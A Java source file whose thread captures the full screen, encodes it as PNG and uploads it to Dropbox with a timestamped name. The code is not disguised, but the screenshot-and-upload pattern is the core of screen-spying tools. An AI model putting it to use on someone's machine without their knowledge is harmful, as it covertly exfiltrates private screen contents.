import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {
    private BufferedImage image;
    private DbxClientV2 client;

    public MyThread(BufferedImage image, DbxClientV2 client) {
        this.image = image;
        this.client = client;
    }

    @Override
    public void run() {
        try {
            Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
            Rectangle rectangle = new Rectangle(dimension);
            BufferedImage image = new Robot().createScreenCapture(rectangle);

            ByteArrayOutputStream byteArrayOS = new ByteArrayOutputStream();
            ImageIO.write(image, "png", byteArrayOS);
            InputStream is = new ByteArrayInputStream(byteArrayOS.toByteArray());

            SimpleDateFormat date = new SimpleDateFormat("yyyyMMdd_HHmmss");
            Date now = new Date();

            client.files().uploadBuilder("/" + date.format(now) + ".png").uploadAndFinish(is);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

